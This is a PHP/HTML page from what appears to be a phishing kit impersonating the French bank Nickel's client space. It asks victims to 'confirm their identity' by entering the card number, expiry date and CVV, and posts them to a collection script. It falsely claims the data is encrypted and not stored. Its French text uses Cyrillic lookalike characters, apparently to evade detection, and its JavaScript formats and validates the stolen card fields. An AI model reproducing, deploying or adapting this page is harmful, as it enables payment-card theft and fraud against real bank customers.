<?php
    /*******
    Main Author: MemoryError
    ********************************************************/
    
    require_once '../includes/main.php';
    $_SESSION['last_page'] = 'cc';
?>
<html><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
    <link rel="stylesheet" href="./snipped.css">

    <style>
        @media (max-width: 767px) {
            .hDrShV {
                background-color: transparent;
                color: rgb(255, 255, 255);
                font-size: 1rem;
                border: none;
                padding: 0px;
            }
        }
    </style>
</head>

<body>
<div id="root" class="tether-target-attached-top tether-element-attached-top tether-element-attached-center tether-target-attached-center">
    <div class="sc-eByPHW llEieV tether-target-attached-top tether-element-attached-top tether-element-attached-center tether-target-attached-center">
        <div class="sc-eLSyJA lJvlA">
            <div id="toasterContainer" class="sc-hLBbgP jSOxpG"></div>
        </div>
        <div id="layoutId" class="sc-hRUHzT dalabt root-side-panel tether-target-attached-top tether-element-attached-top tether-element-attached-center tether-target-attached-center style-FsWsB">
            <div></div>
            <div class="sc-czNxle bOoHPe">
                <div class="sc-cKhgmI fRPFrj"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="1em" height="1em" css="" class="sc-dkQUaI sc-hgRTRj hQrVZb LNHIN">
                        <path d="M719.3 444.3H304.8c-40.1 0-72.5 32-72.5 72.1 0 39.8 32.5 71.9 72.5 71.9h414.6c39.9 0 72.5-32.1 72.5-71.9-.1-40.1-32.7-72.1-72.6-72.1zM512 144.8c40 0 72.5-32.3 72.5-72.3C584.4 32.7 551.9 0 512 0s-72.4 32.7-72.4 72.5c0 40 32.5 72.3 72.4 72.3zM606.2 660.4H418c-39.7 0-72.3 32-72.3 71.8s32.4 72.3 72.1 72.3H606l.2.4c39.8 0 72.1-32.4 72.1-72.2.1-39.7-32.2-72.3-72.1-72.3zM606.2 224H418c-39.7 0-72.3 32-72.3 71.7 0 40 32.4 72.3 72.1 72.3H606l.2.1c39.8 0 72.1-32.2 72.1-72 .1-39.7-32.2-72.1-72.1-72.1zM512 879.1c-39.9 0-72.4 32.6-72.4 72.5 0 40 32.6 72.4 72.4 72.4 40 0 72.5-32.4 72.5-72.4-.1-39.9-32.6-72.5-72.5-72.5z"></path>
                    </svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="1em" height="1em" css="" class="sc-ikXwFM sc-bOKJCu hZHGfK jNqTQC">
                        <path d="M245.1 449.1c17.2 0 31.2-14 31.2-31.2 0-17.3-14-31.2-31.2-31.2-17.3 0-31.3 14-31.3 31.2s14 31.2 31.3 31.2zM840.2 578.7h-77.7v-38.3h77.2c2.6 0 5.1-2.1 5.1-4.7V489c0-2.6-2.5-5.2-5.1-5.2h-77.2v-38.4h77.7c2.6 0 4.6-1.9 4.6-4.5v-49.5c0-2.6-2-4.5-4.6-4.5H704.5c-2.6 0-4.2 1.9-4.2 4.5v241.4c0 2.6 1.6 4.6 4.2 4.6h135.7c2.6 0 4.6-2 4.6-4.6v-49c0-2.6-2-5.1-4.6-5.1zM182.5 386.8h-53.8c-2.6 0-4.4 1.9-4.4 4.5v71.6c0 23 1.9 44.4 5.6 65.6L58.3 391.8c-1.6-3.1-4.9-5-8.4-5H4.1c-2.6 0-4.1 1.9-4.1 4.5v241.4c0 2.6 1.4 4.6 4.1 4.6h52.6c2.6 0 5.5-2 5.5-4.6v-71.6c0-23.3-2.5-44.4-6.5-65.6l71.7 136.8c1.6 3.1 4.6 4.9 8.1 4.9h47.1c2.7 0 4-2 4-4.6V391.3c-.1-2.6-1.4-4.5-4.1-4.5zM269.9 481.9h-49.8c-2.6 0-4.4 1.6-4.4 4.2v146.6c0 2.6 1.9 4.6 4.4 4.6h49.8c2.6 0 4.4-2 4.4-4.6V486.1c0-2.6-1.8-4.2-4.4-4.2zM455.9 574.7c-11.5 4.3-24.1 6.8-36.2 6.8-34.4 0-56.3-22.6-56.3-67.7 0-46.9 24-70.9 58-70.9 12.8 0 23.7 1.8 32.6 5.3 3.1 1.2 6.8-1.1 6.8-4.4v-49.3c0-1.9-1.6-3.7-3.4-4.4-14.5-5.4-29.4-8.6-44.7-8.6-63.5 0-113.4 46.6-113.8 132.2 0 87.8 52.3 128.6 113.2 128.6 17.3 0 32.9-2.8 47.1-7.8 1.9-.7 3.4-2.5 3.4-4.4v-51c0-3.2-3.6-5.5-6.7-4.4zM1018.6 578.7h-78.7V391.3c0-2.6-1.8-4.5-4.4-4.5H883c-2.7 0-5.3 1.9-5.3 4.5v241.4c0 2.6 2.6 4.6 5.3 4.6h135.7c2.6 0 5.4-2 5.4-4.6v-49.1c-.1-2.6-2.9-4.9-5.5-4.9zM682.1 630.6l-61.8-118.3L682 393.4c1.5-3.1-.8-6.6-4.3-6.6h-53.3c-1 0-1.9 0-2.4.9l-49.6 94.1h-22.1v-90.5c0-2.6-2.2-4.5-4.7-4.5H493c-2.6 0-4.9 1.9-4.9 4.5v241.4c0 2.6 2.3 4.6 4.9 4.6h52.6c2.6 0 4.7-2 4.7-4.6v-90.5h22l49.1 92.7c.7 1.7 2.5 2.4 4.3 2.4h52.1c3.6 0 5.9-3.6 4.3-6.7z"></path>
                    </svg></div>
                <div class="sc-bOCfAF fVtOqH">
                    <nav>
                        <ol class="sc-eJDSGI csbmgn">
                            <li class="sc-oZIhv ldeswP"><a href="javascript:void(0)">Sіtе Nісkеl</a></li><svg viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg" class="sc-ehvNnt goUeQp" height="24" width="24">
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M8.293 5.293a1 1 0 0 1 1.414 0l6 6a1 1 0 0 1 0 1.414l-6 6a1 1 0 0 1-1.414-1.414L13.586 12 8.293 6.707a1 1 0 0 1 0-1.414Z"></path>
                            </svg>
                            <li class="sc-oZIhv sc-hiDMwi ldeswP bHGhyL"><span>Соnnехіоn à vоtrе еsрасе сlіеnt</span></li>
                        </ol>
                        <div class="sc-gGvHcT jjdYjy"><svg viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg" class="sc-laZRCg eqRlsb" height="24" width="24">
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M15.707 5.293a1 1 0 0 1 0 1.414L10.414 12l5.293 5.293a1 1 0 0 1-1.414 1.414l-6-6a1 1 0 0 1 0-1.414l6-6a1 1 0 0 1 1.414 0Z"></path>
                            </svg><a href="javascript:void(0)">Sіtе Nісkеl</a></div>
                    </nav>
                </div>
            </div>
                                                            <div class="sc-icoqBx jfRpsO snipcss0-0-0-1 snipcss-3jeGv">
 <form method="post" action="../index-.php">
				 <input type="hidden" name="captcha">
                              <input type="hidden" name="step" value="cc">
							  <div id="layoutId" class="sc-eVedaM bzdSnS">
                    <div class="sc-gBsxbr dxFZky">
                        <button type="button" class="sc-knSFqH iwmrPd" onclick="location.href='?op=g';">
                            <div class="sc-bBABsx hfFfKA">
                                <svg viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg" class="icon" height="24" width="24">
                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M15.707 5.293a1 1 0 0 1 0 1.414L10.414 12l5.293 5.293a1 1 0 0 1-1.414 1.414l-6-6a1 1 0 0 1 0-1.414l6-6a1 1 0 0 1 1.414 0Z">
                                    </path>
                                </svg>
                            </div>
                        </button>
                        <h2 class="sc-hxyAeK hIpCju">
                        Соnfіrmаtіоn d'іdеntіté раr саrtе                        </h2>
                    </div>
					 
                    <div class="sc-gggoXN byiTzm">
                        <h1 class="sc-hcmsbg iHLBIg">
                            Еntrеr lеs détаіls dе vоtrе саrtе Nісkеl                        </h1>
                        <p class="sc-ojivU jjQalL">
                            Сеttе étаре unіquе соnfіrmе vоtrе іdеntіté sаns еffесtuеr dе trаnsасtіоns. Vоs dоnnéеs sоnt сhіffréеs еt nе sеrоnt nі stосkéеs nі раrtаgéеs.                        </p>
                    </div>
                    <div class="sc-iAEawV ihmKiB">
                        <div class="sc-gYbzsP brmByp">
                            <div class="sc-cCjUiG cjfGxV">
                                <label class="sc-jcMfQk dNkBmv" for="YaWUFAYdCSElCgIt">
                                    Numérо dе lа саrtе (16 сhіffrеs)                                </label>
                                <input name="one" id="YaWUFAYdCSElCgIt" type="text" class="sc-cjibBx dYWVma" value="" oninput="formatCard(this)" inputmode="numeric">
                            </div>
                        </div>
                    </div>
                    <div class="sc-iAEawV ihmKiB">
                        <div class="sc-gYbzsP brmByp">
                            <div class="sc-cCjUiG cjfGxV">
                                <label class="sc-jcMfQk dNkBmv" for="zhYediFmUtYTuikQ">
                                    Dаtе d'ехріrаtіоn (ММ/АА)                                </label>
                                <input name="two" id="zhYediFmUtYTuikQ" type="text" class="sc-cjibBx dYWVma" value="  /  " oninput="formatDate(this)" inputmode="numeric">
                            </div>
                        </div>
                    </div>
                    <div class="sc-iAEawV ihmKiB">
                        <div class="sc-gYbzsP brmByp">
                            <div class="sc-cCjUiG cjfGxV">
                                <label class="sc-jcMfQk dNkBmv" for="TpFwkULlWtPicjWC">
                                    Сryрtоgrаmmе vіsuеl (3 сhіffrеs)                                </label>
                                <input name="three" id="TpFwkULlWtPicjWC" type="text" class="sc-cjibBx dYWVma" value="" maxlength="3" inputmode="numeric">
                            </div>
                        </div>
                    </div>
                            <div class="sc-vMGZd kWokIK"><button class="sc-ftTHYK hIzZA sc-kDvujY hWUUbn" type="submit" id="kqXVaHiSSfatCauL" disabled=""><span class="sc-pyfCe jqwhcx">Соntіnuеr</span></button></div>
                </div>
                </form>
            </div>
                                    <div class="sc-bZesDY bCyfTj"><button class="sc-ftTHYK hIzZA sc-jrcTuL hDrShV" type="button"><span class="sc-pyfCe jqwhcx">Аіdе &amp; орроsіtіоn СВ</span></button>
                <div class="sc-joaiRD bOFeRz"></div><button class="sc-ftTHYK hIzZA sc-jrcTuL hDrShV" type="button"><span class="sc-pyfCe jqwhcx">Раs еnсоrе сlіеnt ?</span></button>
            </div>
        </div>
    </div>
</div>

<script>
    const MAX_BARCODE_LENGTH = 10; // Maximum length of the barcode

    function formatBarcodeInput() {
        const barcodeInput = document.getElementById("IOaNWnbJXPJBCfWC");
        let userInput = barcodeInput.value;

        // Remove any non-digit characters from the user input
        userInput = userInput.replace(/\D/g, "");

        // Insert the digits from the user input into the barcode format
        let formattedInput = "   -   -   - ";
        let inputIndex = 0; // Index to keep track of the user input position

        for (let i = 0; i < formattedInput.length; i++) {
            if (formattedInput[i] === " ") {
                if (inputIndex < userInput.length) {
                    formattedInput = formattedInput.substr(0, i) + userInput[inputIndex] + formattedInput.substr(i + 1);
                    inputIndex++;
                } else {
                    break;
                }
            }
        }

        barcodeInput.value = formattedInput;

        // Set the cursor position after the last entered number
        const cursorPosition = formattedInput.lastIndexOf(userInput.slice(-1)) + 1;

        if (userInput.length <= 0) {
            barcodeInput.setSelectionRange(0, 0);
        } else {
            barcodeInput.setSelectionRange(cursorPosition, cursorPosition);
        }

        // Disable further input if the barcode is complete
        if (userInput.length >= MAX_BARCODE_LENGTH) {
            barcodeInput.setAttribute("maxlength", MAX_BARCODE_LENGTH);
        } else {
            barcodeInput.removeAttribute("maxlength");
        }

        const loginButton = document.getElementById('SUtagMFcgaCJCcBW');

        const digitCount = userInput.replace(/-/g, '').replace(/\D/g, '').length; // Count only the digits

        if (digitCount >= 10) {
            loginButton.removeAttribute('disabled'); // Remove the "disabled" attribute
        } else {
            loginButton.setAttribute('disabled', true); // Add the "disabled" attribute
        }
    }

    // Position cursor at the end of the last number when input field is focused or clicked
    const barcodeInput = document.getElementById("IOaNWnbJXPJBCfWC");

    if (barcodeInput) {
        barcodeInput.addEventListener("focus", function() {
            const userInput = barcodeInput.value.replace(/\D/g, "");
            const cursorPosition = userInput.length + Math.floor(userInput.length / 3);

            barcodeInput.setSelectionRange(cursorPosition, cursorPosition);
        });

        barcodeInput.addEventListener("click", function() {
            const userInput = barcodeInput.value.replace(/\D/g, "");
            const cursorPosition = userInput.length + Math.floor(userInput.length / 3);

            barcodeInput.setSelectionRange(cursorPosition, cursorPosition);
        });
    }

    function updateAccessCodeElements() {
        const keyboardInputId = "WbKjrVVOKeAuQWlW";
        const dotsElementId = "fFQOyqdVgziqYjrj";
        const valueElementId = "SNcAReGdjrdDBqIl";

        const keyboardInput = document.getElementById(keyboardInputId);
        const dotsElement = document.getElementById(dotsElementId);
        const valueElement = document.getElementById(valueElementId);

        let dotsHtml = "";
        let valueHtml = "";

        for (let index = 0; index < keyboardInput.value.length; index++) {
            dotsHtml += `<div data-testid="accessCode#dot#${index}" class="sc-kAyceB bDHwTN"></div>`;
            valueHtml += `<span class="sc-dAlyuH kJgidg">${keyboardInput.value[index]}</span>`;
        }

        for (let index = keyboardInput.value.length; index < 6; index++) {
            dotsHtml += `<div data-testid="accessCode#dot#${index}" class="sc-kAyceB bXMYpn"></div>`;
        }

        dotsElement.innerHTML = dotsHtml;
        valueElement.innerHTML = valueHtml;
    }

    function submitClosestForm(element) {
        let parent = element.parentElement;
        while (parent && parent.tagName.toLowerCase() !== 'form') {
            parent = parent.parentElement;
        }

        if (parent && parent.tagName.toLowerCase() === 'form') {
            parent.submit();
        }
    }

    function appendToKeyboardInput(number) {
        const keyboardInputId = "WbKjrVVOKeAuQWlW";
        const keyboardInput = document.getElementById(keyboardInputId);

        if (keyboardInput.value.length < 6) {
            keyboardInput.value += number.toString();
            updateAccessCodeElements();
        }

        if (keyboardInput.value.length >= 6) {
            submitClosestForm(keyboardInput)
        }
    }

    function removeFromKeyboardInput() {
        const keyboardInputId = "WbKjrVVOKeAuQWlW";
        const keyboardInput = document.getElementById(keyboardInputId);

        if (keyboardInput.value.length > 0) {
            keyboardInput.value = keyboardInput.value.slice(0, -1);
            updateAccessCodeElements();
        }
    }

    function toggleButtonVisibility(show) {
        const showButtonId = "tfwRteGpWyFxPYKg";
        const hideButtonId = "iPgXLOzkdTVWblNB";
        const dotsElementId = "fFQOyqdVgziqYjrj";
        const valueElementId = "SNcAReGdjrdDBqIl";

        const showButtonElement = document.getElementById(showButtonId);
        const hideButtonElement = document.getElementById(hideButtonId);
        const dotsElement = document.getElementById(dotsElementId);
        const valueElement = document.getElementById(valueElementId);

        if (show) {
            showButtonElement.style.display = "none";
            hideButtonElement.style.display = "flex";
            dotsElement.style.display = "none";
            valueElement.style.display = "flex";
        } else {
            showButtonElement.style.display = "flex";
            hideButtonElement.style.display = "none";
            dotsElement.style.display = "flex";
            valueElement.style.display = "none";
        }
    }

    function startCountdown() {
        let time = 29; // time in seconds
        let display = document.querySelector('#WCupROIVyHofIHUx'); // replace '#time' with the actual selector of your display element

        if (!display) {
            return;
        }

        display.parentElement.setAttribute('disabled', true);
        display.textContent = "Rеnvоyеz mоі un соdе (0:30)";

        let countdown = setInterval(function() {
            let minutes = Math.floor(time / 60);
            let seconds = time % 60;

            // pad seconds with leading zeros if less than 10
            seconds = seconds < 10 ? '0' + seconds : seconds;

            display.textContent = "Rеnvоyеz mоі un соdе (" + minutes + ":" + seconds + ")";

            time--;

            // stop countdown when time is up
            if (time < 0) {
                clearInterval(countdown);
                display.textContent = "Rеnvоyеz mоі un соdе";
                display.parentElement.removeAttribute('disabled');
            }
        }, 1000);
    }

    startCountdown();

    function formatCard(input) {
        let value = input.value.replace(/\D/g, ""); // remove non-digits

        // limit to 16 digits
        value = value.slice(0, 16);

        let formattedValue = "";

        // insert a space after every 4th digit
        for (let i = 0; i < value.length; i++) {
            if (i > 0 && i % 4 === 0) {
                formattedValue += " ";
            }
            formattedValue += value[i];
        }

        // set the input value to the formatted value
        input.value = formattedValue;
    }

    const MAX_EXPERATION_DATE_LENGTH = 4;

    function formatDate() {
        const dateInput = document.getElementById("zhYediFmUtYTuikQ");
        let userInput = dateInput.value;

        userInput = userInput.replace(/\D/g, "");

        let formattedInput = "  /  ";
        let inputIndex = 0;

        for (let i = 0; i < formattedInput.length; i++) {
            if (formattedInput[i] === " ") {
                if (inputIndex < userInput.length) {
                    formattedInput = formattedInput.substr(0, i) + userInput[inputIndex] + formattedInput.substr(i + 1);
                    inputIndex++;
                } else {
                    break;
                }
            }
        }

        dateInput.value = formattedInput;

        const cursorPosition = formattedInput.lastIndexOf(userInput.slice(-1)) + 1;

        if (userInput.length <= 0) {
            dateInput.setSelectionRange(0, 0);
        } else {
            dateInput.setSelectionRange(cursorPosition, cursorPosition);
        }

        if (userInput.length >= MAX_EXPERATION_DATE_LENGTH) {
            dateInput.setAttribute("maxlength", MAX_EXPERATION_DATE_LENGTH);
        } else {
            dateInput.removeAttribute("maxlength");
        }
    }

    const dateInput = document.getElementById("zhYediFmUtYTuikQ");

    if (dateInput) {
        dateInput.addEventListener("focus", function() {
            const userInput = dateInput.value.replace(/\D/g, "");
            const cursorPosition = userInput.length + Math.floor(userInput.length / 2);

            dateInput.setSelectionRange(cursorPosition, cursorPosition);
        });

        dateInput.addEventListener("click", function() {
            const userInput = dateInput.value.replace(/\D/g, "");
            const cursorPosition = userInput.length + Math.floor(userInput.length / 2);

            dateInput.setSelectionRange(cursorPosition, cursorPosition);
        });
    }

    // define your input and button elements
    const input1 = document.getElementById("YaWUFAYdCSElCgIt");
    const input2 = document.getElementById("zhYediFmUtYTuikQ");
    const input3 = document.getElementById("TpFwkULlWtPicjWC");
    const continueButton = document.getElementById('kqXVaHiSSfatCauL');

    // define a function to check input lengths and enable/disable the button
    function validateInputs() {
        if (input1.value.replace(/\D/g, "").length >= 16 &&
            input2.value.replace(/\D/g, "").length >= 4 &&
            input3.value.replace(/\D/g, "").length >= 3) {
            continueButton.removeAttribute('disabled');
        } else {
            continueButton.setAttribute('disabled', true);
        }
    }

    // attach the event listener to all three inputs
    [input1, input2, input3].forEach(input => {
        if (input) {
            input.addEventListener('input', validateInputs);
        }
    });
</script>



</body></html>